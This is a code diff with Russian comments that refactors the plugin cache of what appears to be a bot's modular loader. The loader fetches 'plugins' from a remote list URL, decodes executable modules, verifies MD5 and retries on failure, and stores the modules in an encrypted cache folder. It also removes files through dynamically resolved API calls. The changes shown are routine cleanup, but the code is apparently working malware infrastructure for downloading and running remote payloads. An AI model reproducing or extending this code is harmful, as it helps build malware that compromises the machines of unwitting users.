@@ -252,51 +252,17 @@ namespace PLGLoader
 }
 
 
-//****************************************************************************
-//	Методя для работ с кэшем плагинов
-//****************************************************************************
-namespace PLGCACHE
+
+const static char* PluginsCacheFolder = "pgcache"; ;
+
+//=========================================================================
+
+string GetPluginCacheFileName(PCHAR PluginName)
 {
-
-	char CacheFolder[] = {'p', 'g', 'c', 'h', 'e', '\\', 0};
-
-	//=========================================================================
-
-	PCHAR inline GetCachePath()
-	{
-		// Функция возвращает путь к хранилищу кеша
-		return BOT::GetWorkPath(CacheFolder, NULL);
-	}
-	//-------------------------------------------------------------------------
-
-	PCHAR GetPluginCacheFileName(PCHAR Path, PCHAR PluginName)
-	{
-		// Функция возвращает имя файла плагина
-		if (STR::IsEmpty(PluginName))
-        	return NULL;
-
-
-		// Получаем путь к хранилищу
-		bool FreePath = STR::IsEmpty(Path);
-		if (FreePath)
-			Path = GetCachePath();
-		if (Path == NULL)
-			return NULL;
-
-
-		// Получаем полное имя файла
-		PCHAR FN = STR::New(2, Path, PluginName);
-
-
-        // Освобождаем данне
-		if (FreePath)
-            STR::Free(Path);
-
-		return FN;
-	}
-	//-------------------------------------------------------------------------
-
+	return BOT::MakeFileName(PluginsCacheFolder, PluginName);
 }
+//-------------------------------------------------------------------------
+
 
 //****************************************************************************
 //  Методы работы с плагинами
@@ -636,34 +602,22 @@ LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool
 LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 				  bool IsExecutable, bool UseCache, PCHAR CachePath)
 {
+	if (Size) *Size = 0;
+
+	if (STRA::IsEmpty(PluginName)) return NULL;
+
 	// Начало цикла по выкачиванию файла плага.
 	// Поддерживает проверку MD5 плага.
 	while (true)
 	{
-		// Функция загружает и декодирует плагин используя
-		// дополнительные настройки
-		if (Size != NULL)
-			*Size = 0;
-
-		// Получаем имя файла кэша
-		PCHAR CacheFileName = NULL;
-		if (UseCache)
-			CacheFileName = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
-
-		PDBG("Plugins", "DownloadEx: GetPluginCacheFileName() CacheFileName='%s'", CacheFileName);
-
-		DWORD BufSize = 0;
+		DWORD  BufSize = 0;
 		LPBYTE Buffer = NULL;
 		PCHAR  ReceivedMd5 = NULL;
 
 		// Проверяем наличие файла в кэше и флаг использования кеша
-		if (CacheFileName != NULL)
+		if (UseCache)
 		{
-			PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'", CacheFileName);
-			
-			Buffer = (LPBYTE)CryptFile::ReadToBuffer(CacheFileName, &BufSize, NULL);
-			
-			PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X", Buffer);
+			Buffer = LoadFromCache(PluginName, &BufSize);
 		}
 
 		// загружаем файл плагина из сети, если:
@@ -672,12 +626,8 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 		bool Downloaded = false;
 		if (Buffer == NULL)
 		{
-			PDBG("Plugins", "DownloadEx: try DownloadFile() CacheFileName='%s'", CacheFileName);
-
 			Buffer = DownloadFile(PluginName, PluginListURL, &BufSize, &ReceivedMd5);
 			Downloaded = true;
-		
-			PDBG("Plugins", "DownloadEx: DownloadFile() result 0x%X size=%u", Buffer, BufSize);
 		}
 
 		if (Buffer == NULL)
@@ -697,15 +647,9 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 		LPBYTE Module = NULL;
 
 		if (!IsExecutable || !IsExecutableFile(Buffer))
-		{
 			Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
-			PDBG("Plugins", "DownloadEx: loaded buffer decoded.");
-		}
 		else
-		{
-			PDBG("Plugins", "DownloadEx: loaded buffer NOT decoding.");
 			Module = Buffer;
-		}
 
 		// Если файл был выкачан и была получена MD5 - проверяем MD5 сумму.
 		// Если контрольная сумма не совпала - пробуем подгрузить всё заново.
@@ -720,7 +664,6 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 				// Освобождаем ресурсы
 				MemFree(Buffer);
 				if (Module != Buffer) MemFree(Module);
-				STR::Free(CacheFileName);
 
 				// Немного спим и запускаем закачку заново
 				PDBG("Plugins", "DownloadEx: ReceivedMd5 and CalculatedMd5 are not equal. Sleeping 30 sec and trying again.");
@@ -731,16 +674,13 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 
 		// При необходимости кэшируем файл:
 		// когда выставлен флаг использования кеша и файл был скачан из сети
-		if (CacheFileName != NULL && Downloaded && Module != NULL)
+		if (UseCache && Downloaded && Module)
 		{
-			PDBG("Plugins", "DownloadEx: writing file to CacheFileName='%s'", CacheFileName);
-			CryptFile::WriteFromBuffer(CacheFileName, Module, BufSize, NULL);
+			SaveToCache(PluginName, Module, BufSize);
 		}
 
 		// Освобождаем данные
 		if (Module != Buffer) MemFree(Buffer);
-		STR::Free(CacheFileName);
-
 
 		// Возвращаем результат
 		if (Size != NULL)
@@ -753,62 +693,55 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 }
 //---------------------------------------------------------------------------
 
-bool Plugin::DownloadInCache(PCHAR PluginName, bool IsExecutable, bool IgnoreIfExists, PCHAR CachePath)
+
+//-----------------------------------------------
+//  SaveToCache
+//  Кэширует данные плагина
+//-----------------------------------------------
+bool Plugin::SaveToCache(PCHAR PluginName,  LPVOID Data, DWORD DataSize)
 {
-	//  функция загружает плагин в кэш
-
-	// Проверяем существует ли файл на диске
-	if (IgnoreIfExists)
+	bool Result = false;
+	if (Data && DataSize && !STRA::IsEmpty(PluginName))
 	{
-		PCHAR FN = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
-		bool Exists = FileExistsA(FN);
-		STR::Free(FN);
-
-		if (Exists)
-        	return true;
+		string FN = GetPluginCacheFileName(PluginName);
+		Result = CryptFile::WriteFromBuffer(FN.t_str(), Data, DataSize);
     }
-
-    // Загружаем файл
-	LPBYTE Buf = DownloadEx(PluginName, NULL, NULL, IsExecutable, true, CachePath);
-
-	bool Result = Buf != NULL;
-
-	MemFree(Buf);
-
 	return Result;
 }
-//---------------------------------------------------------------------------
 
 
-LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR CachePath, DWORD *PluginSize)
+
+//------------------------------------------------
+//  LoadFromCache
+//  функция загружает плагин из кэша
+//------------------------------------------------
+LPBYTE Plugin::LoadFromCache(PCHAR PluginName, DWORD *PluginSize)
 {
-	// функция загружает плагин из кэша
-	if (PluginSize != NULL)
-        *PluginSize = 0;
-
-	PCHAR FN = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
-
-	if (FN == NULL)
-		return NULL;
-
-	DWORD Size = 0;
-	LPBYTE Buf = (LPBYTE)CryptFile::ReadToBuffer(FN, &Size, NULL);
-
-
-	if (Buf != NULL && IsExecutable  && !IsExecutableFile(Buf))
+	LPBYTE Result = NULL;
+	if (!STRA::IsEmpty(PluginName))
 	{
-		MemFree(Buf);
-		Buf = NULL;
-		Size = 0;
+		string FN = GetPluginCacheFileName(PluginName);
+		Result = (LPBYTE)CryptFile::ReadToBuffer(FN.t_str(), PluginSize);
     }
-
-	STR::Free(FN);
-
-	if (PluginSize != NULL)
-		*PluginSize = Size;
-    return Buf;
+	return Result;
 }
-//---------------------------------------------------------------------------
+
+
+//------------------------------------------------
+//  DeleteFromCache
+//  Функция удаляет  файл плагина из кэша
+//------------------------------------------------
+bool Plugin::DeleteFromCache(PCHAR PluginName)
+{
+	bool Result = false;
+	if (!STRA::IsEmpty(PluginName))
+	{
+		string FN = GetPluginCacheFileName(PluginName);
+		Result = (BOOL)pDeleteFileA(FN.t_str());
+    }
+	return Result;
+}
+
 
 /*
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
